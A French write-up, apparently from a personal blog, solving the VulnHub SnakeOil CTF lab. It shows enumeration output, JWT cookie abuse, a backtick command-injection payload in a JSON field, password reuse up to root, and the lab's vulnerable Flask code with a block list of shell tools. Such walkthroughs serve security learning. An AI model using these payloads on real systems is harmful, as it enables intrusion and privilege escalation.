---
title: "Solution du CTF SnakeOil de VulnHub"
tags: [CTF, VulnHub]
---

[digitalworld.local: snakeoil](https://vulnhub.com/entry/digitalworldlocal-snakeoil,738/) est un autre CTF proposé par *Donavan* et récupérable sur la plateforme VulnHub.

```console
$ sudo nmap -sCV -T5 -p- 192.168.56.123
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 17:01 CET
Nmap scan report for 192.168.56.123
Host is up (0.00012s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 73a48f94a22068505aaee1d3608dff55 (RSA)
|   256 f31bd8c30c3f5e6bac9952807bd6b6e7 (ECDSA)
|_  256 ea6164b63bd3840150d81aab382912e1 (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-title: Welcome to SNAKEOIL!
|_http-server-header: nginx/1.14.2
8080/tcp open  http    nginx 1.14.2
|_http-title:  Welcome to Good Tech Inc.'s Snake Oil Project 
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:F4:2D:F9 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.62 seconds
```

Le port 80 ne semble rien contenir d'intéressant après une bonne grosse énumération avec la wordlist de *DirBuster*.

Le port 8080 qui a tout l'air d'une appli *Python + Flask* dispose de différents endpoints :

```console
$ feroxbuster -u http://192.168.56.123:8080/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.123:8080/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
405        1l       10w       64c http://192.168.56.123:8080/login
200        1l        2w       17c http://192.168.56.123:8080/test
200       47l      125w     2193c http://192.168.56.123:8080/1
200        1l        5w      140c http://192.168.56.123:8080/users
200       51l      151w     2356c http://192.168.56.123:8080/2
200       71l      170w     2882c http://192.168.56.123:8080/
200        1l        3w       29c http://192.168.56.123:8080/registration
200       45l      139w     2324c http://192.168.56.123:8080/4
200       47l      125w     2193c http://192.168.56.123:8080/01
200       51l      151w     2356c http://192.168.56.123:8080/02
200       45l      139w     2324c http://192.168.56.123:8080/04
200       61l      147w     2596c http://192.168.56.123:8080/create
500        1l        4w       37c http://192.168.56.123:8080/secret
405        4l       23w      178c http://192.168.56.123:8080/run
200       47l      125w     2193c http://192.168.56.123:8080/001
200       51l      151w     2356c http://192.168.56.123:8080/002
200       47l      125w     2193c http://192.168.56.123:8080/0001
200       45l      139w     2324c http://192.168.56.123:8080/004
200       51l      151w     2356c http://192.168.56.123:8080/0002
200       45l      139w     2324c http://192.168.56.123:8080/0004
200       47l      125w     2193c http://192.168.56.123:8080/000001
[####################] - 3m    119601/119601  0s      found:21      errors:0      
[####################] - 3m    119601/119601  542/s   http://192.168.56.123:8080/
```

## Curly

On va utiliser cURL pour questionner les différentes URLs.

```console
$ curl http://192.168.56.123:8080/users
{"users": [{"username": "patrick", "password": "$pbkdf2-sha256$29000$e0/J.V.rVSol5HxPqdW6Nw$FZJVgjNJIw99RIiojrT/gn9xRr9SI/RYn.CGf84r040"}]}
```

Ce hash ne semble pas destiné à être cassé au vu du chiffrement utilisé (29000 itérations de pbkdf2-sha256 si je lis correctement).

J'ai toutefois lancé _JtR_ dessus au cas où, avant de laisser tomber.

J'ai ensuite jeté mon dévolu sur le script de login :

```console
$ curl http://192.168.56.123:8080/login
{"message": "The method is not allowed for the requested URL."}
$ curl -XPOST http://192.168.56.123:8080/login
{"message": {"username": "Username field cannot be blank."}}
$ curl -XPOST http://192.168.56.123:8080/login --data "username=patrick"
{"message": {"password": "Password field cannot be blank."}}
$ curl -XPOST http://192.168.56.123:8080/login --data "username=patrick&password=test"
{"message": "Wrong credentials"}
$ curl -XPOST http://192.168.56.123:8080/login --data "username=a&password=test"
{"message": "User a doesn't exist"}
```

Au vu de la réponse spécifique quand l'utilisateur n'existe pas, j'ai tenté de brute-forcer les noms, mais seul `patrick` en est ressorti.

L'URL `/run` attend elle aussi des données soumises via POST.

```console
$ curl -XPOST http://192.168.56.123:8080/run
{"message":"Please provide URL to request in the form url:port. Example: 127.0.0.1:12345","success":false}
```

J'ai débord tenté de trouver un paramètre valide avec la soumission standard (comprendre *x-www-form-urlencoded*) :

```bash
ffuf -X POST -u 'http://192.168.56.123:8080/run' -d 'FUZZ=192.168.56.1:9999' -H 'Content-Type: application/x-www-form-urlencoded' -w wordlists/common_query_parameter_names.txt -fr "Please provide URL"
```

Finalement en JSON c'est accepté, mais il faut disposer aussi d'une clé secrète :

```console
$ curl -XPOST http://192.168.56.123:8080/run -H "Content-Type: application/json" -d '{"url": "192.168.56.1:9999"}'
{"message":"We need your secret key!","success":false}
```

Le nom du paramètre était relativement simple à trouver :

```console
$ curl -XPOST http://192.168.56.123:8080/run -H "Content-Type: application/json" -d '{"url": "192.168.56.1:9999", "secret_key": "toto"}'
{"message":"Wrong secret key! Alert will be raised!","success":false}
```

J'ai ensuite passé pas mal de temps à trouver ce que je devais passer pour `secret_key`. Bien sûr, je me rappelais l'existence de l'endpoint `/secret` mais je ne savais pas comment y accéder ni pourquoi il retournait un statut `500`.

Finalement, c'était assez logique : il fallait créer un compte via `/registration`, puis se connecter via `/login` :

```console
$ curl -XPOST http://192.168.56.123:8080/registration --data "username=devloop&password=devloop"
{"message": "User devloop was created. Please use the login API to log in!", "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY3ODY5ODYxMywianRpIjoiNGE1MTIwNWItNTI5MS00MzBkLTkyNDMtYzE2N2NkNjhkYWI5IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmxvb3AiLCJuYmYiOjE2Nzg2OTg2MTMsImV4cCI6MTY3ODY5OTUxM30.hTSQloDLWqb3O77kjpX5bl9fpTchedpx4znE6J79_Wk"}
$ curl -XPOST http://192.168.56.123:8080/login --data "username=devloop&password=devloop"
{"message": "Logged in as devloop", "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY3ODY5ODc0OSwianRpIjoiMGNmMGY5MWUtNDc0OC00ZjUwLWFmODQtZjlhOTllMjgzOTdmIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmxvb3AiLCJuYmYiOjE2Nzg2OTg3NDksImV4cCI6MTY3ODY5OTY0OX0.CRxrykSkdFSRNRd24rAbXxPg5bGAXr7ypkJFuI11cAY", "refresh_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY3ODY5ODc0OSwianRpIjoiZGI1Mjc0NTItMGJmYS00ODRjLWI3MTQtMGY3MDVmOGRlZTM0IiwidHlwZSI6InJlZnJlc2giLCJzdWIiOiJkZXZsb29wIiwibmJmIjoxNjc4Njk4NzQ5LCJleHAiOjE2Nzg3MDIzNDl9.YlvrWgLYV51gCE8v50He1bDHGmsBYnwMqTwn7XA7nAE"}
```

On pouvait alors questionner l'endpoint `/secret`. On disposait d'un indice dans l'un des posts du blog (l'appli Flask est grosso modo un blog) via une URL qui mentionnait différentes solutions d'authentification ([Configuration Options flask-jwt-extended 4.4.4 documentation](https://flask-jwt-extended.readthedocs.io/en/stable/options/#JWT_ACCESS_COOKIE_NAME)). Après quelques essais, c'était l'authentification par cookie qu'il fallait utiliser :

```console
$ curl http://192.168.56.123:8080/secret -H "Cookie: access_token_cookie=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY3ODcwNzMzOCwianRpIjoiMzk2NWMxMWYtOTljYy00OWUyLTgzNTYtOGZjNmM2MGZjMWZhIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6ImRldmxvb3AiLCJuYmYiOjE2Nzg3MDczMzgsImV4cCI6MTY3ODcwODIzOH0.R1UKwM6-8Z-xIGmpTBeZy5y5TZmtvzj1IFqtnuSf1zw;"
{"ip-address": "", "secret_key": "commandexecutionissecret"}
```

Il fallait aussi que le token soit assez frais. J'ai dû re-procéder à une authentification.

## Injection de commande

On peut finalement questionner l'endpoint `/run` :

```console
$ curl -XPOST http://192.168.56.123:8080/run -H "Content-Type: application/json" -d '{"url": "192.168.56.1:9999", "secret_key": "commandexecutionissecret"}'
{"message":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\r100    20  100    20    0     0   6666      0 --:--:-- --:--:-- --:--:--  6666\n","success":false}
```

Cela génère une requête cURL dont on peut capturer la requête :

```http
GET / HTTP/1.1
Host: 192.168.56.1:9999
User-Agent: curl/7.64.0
Accept: */*
```

Après avoir testé l'hypothèse que le script download un fichier puis l'exécute ou l'interprète (langage bash, python, php), c'est finalement l'essai d'une injection de commande qui a fonctionné :

```console
$ curl -XPOST http://192.168.56.123:8080/run -H "Content-Type: application/json" -d '{"url": "192.168.56.1:9999`id`", "secret_key": "commandexecutionissecret"}'
{"message":"curl: (3) URL using bad/illegal format or missing URL\n --- snip --- Could not resolve host: groups=33(www-data),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)\n","success":false}
```

L'API semble avoir un filtre pour bloquer l'utilisation de `nc` mais les autres commandes telles que `wget`, `chmod` peuvent être injectées. C'est suffisant pour uploader une backdoor et récupérer un accès.

## Password reuse

L'appli tournait avec l'utilisateur `patrick` :

```console
patrick@SNAKEOIL:/home/patrick/flask_blog$ ls
__pycache__  app.py       flask_blog       flaskapi  init_db.py  models.py   requirements.txt  schema.sql  templates  wsgi.py
app.db       database.db  flask_blog.sock  hello.py  library.db  output.txt  resources.py      static      views.py
patrick@SNAKEOIL:/home/patrick/flask_blog$ id
uid=1000(patrick) gid=33(www-data) groups=33(www-data),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
```

On trouve deux mots de passe dans la config Flask (`app.py`) :

```python
app = Flask(__name__)
api = Api(app)
app.config['SECRET_KEY'] = 'snakeoilisnotgoodforcorporations'
app.config['JWT_COOKIE_SECURE'] = True
app.config['JWT_SECRET_KEY'] = 'NOreasonableDOUBTthisPASSWORDisGOOD'
app.config['JWT_ACCESS_TOKEN_EXPIRES'] = timedelta(minutes=15)
app.config['JWT_REFRESH_TOKEN_EXPIRES'] = timedelta(hours=1)
app.config['JWT_TOKEN_LOCATION'] = ['cookies']
app.config['JWT_COOKIE_CSRF_PROTECT'] = False # development setting!

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///app.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
```

Le second mot de passe est aussi celui du compte Unix. Et l'utilisateur peut exécuter n'importe quelle commande en tant que root si le mot de passe est saisi :

```console
patrick@SNAKEOIL:/home/patrick/flask_blog$ sudo su
[sudo] password for patrick:
root@SNAKEOIL:/home/patrick/flask_blog# cd /root
root@SNAKEOIL:~# ls
proof.txt  sudoers.bak
root@SNAKEOIL:~# cat proof.txt 
Congratulations on obtaining a root shell on this machine! :-)
```

## How it works

Voici juste un extrait de l'appli Flask pour l'endpoint `/run` :

```python
# backdoor. dangerous!

@app.route("/run", methods=["POST"])
def backdoor():
    req_json = request.get_json()

    if req_json is None or "url" not in req_json:
        abort(400, description="Please provide URL to request in the form url:port. Example: 127.0.0.1:12345")

    if "secret_key" not in req_json:
        abort(400, description="We need your secret key!")

    if req_json["secret_key"] != "commandexecutionissecret":
        abort(400, description="Wrong secret key! Alert will be raised!")

    # write some validation rules to stop shell commands

    if "bash" in req_json["url"]:
        abort(400, description="Banned command!")

    if "python" in req_json["url"]:
        abort(400, description="Banned command!") 

    if "/dev/tcp" in req_json["url"]:
        abort(400, description="Banned command!")

    if "nc" in req_json["url"]:
        abort(400, description="Banned command!")

    if "mkfifo" in req_json["url"]:
        abort(400, description="Banned command!")

    if "php" in req_json["url"]:
        abort(400, description="Banned command!")

    # if the command is allowed, run it because it is probably safe.

    proc = Popen("/usr/bin/curl " + req_json["url"] + " > output.txt", stdout=PIPE, stderr=PIPE, shell=True)

    try:
        outs, errs = proc.communicate(timeout=1)
    except TimeoutExpired:
        proc.kill()
        abort(500, description="The timeout is expired!")

    if errs:
        abort(500, description=errs.decode('utf-8'))

    return jsonify(success=True, message=outs.decode('utf-8'))
```

C'est assez rare de devoir jouer avec une API sur un CTF mais je trouve ça assez réaliste. L'autre CTF que je connais qui s'en rapprochait était le [CTF SP: Alphonse]({% link _posts/2022-12-13-Solution-du-CTF-Alphonse-de-VulnHub.md %})
